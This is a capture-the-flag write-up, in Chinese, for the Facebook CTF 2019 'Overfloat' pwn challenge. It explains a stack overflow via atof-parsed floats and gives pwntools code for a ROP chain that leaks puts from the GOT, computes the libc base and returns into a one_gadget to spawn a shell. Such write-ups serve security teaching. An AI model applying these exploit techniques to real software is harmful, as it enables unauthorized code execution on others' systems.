Overfloat - PWN 100
===

## Introduction
**facebook ctf 2019 - pwn 100**


這題程式會用**fgets**讀取input，再用**atof**轉型成**float**
![image](https://i.imgur.com/OZKBs1k.png)
紅色框起來的部分是我們要overflow的地方
他會把main裡的stack address傳進chart_course
而這邊寫入的位址就是main的stack
雖然前面印出來的LON,LAT的index會重置，但實際上a1這個array的index卻會一直往下跑，所以算好offset就可以成功蓋到ret addr。
輸入done就可以結束程式。(break while loop)

## exploit
因為程式是用**atof()**強制轉型成float num，所以我們可以用unpack('f',p32(num))[0]
讓atof成功寫入我們想要的值。

```python=
from pwn import *
import struct

def defloat(num):
    return str(struct.unpack('f',p32(num))[0])
```

算好offset之後，接著就是基本ROP chain的應用。
但這邊要注意的是，一次寫入只有32bits，而leak的rop gadget都是小於32bits。
但64位元的OS一次pop rip都是64bits，所以要補0。

```python=

junk = defloat(0xdeadbeef)

p.recvuntil('?')
for i in range(0,14):
    p.recvuntil(': ')
    p.sendline(junk)
p.sendline(defloat(pop_rdi_ret))
p.sendline(defloat(0))
p.sendline(defloat(puts_got))
p.sendline(defloat(0))
p.sendline(defloat(puts_plt))
p.sendline(defloat(0))
# return to main to read one gadget
p.sendline(defloat(main))
p.sendline(defloat(0))
```

成功leak puts_libc之後就是算libc_base，ret one_gadget

但這邊onegadget要分兩次寫入

```python=
def one(num):
    return str(struct.unpack('f', num)[0])
    
one_gadget = libc_base + 0x4f2c5

# offset
p.recvuntil('?')
for i in range(0,14):
    p.recvuntil(': ')
    p.sendline(junk)
one1 = p64(one_gadget)[4:8]
one2 = p64(one_gadget)[0:4]
# write ret addr 
p.sendline(one(one2))
p.sendline(one(one1))
p.sendline('done')
p.interactive()
```

**get shell!**
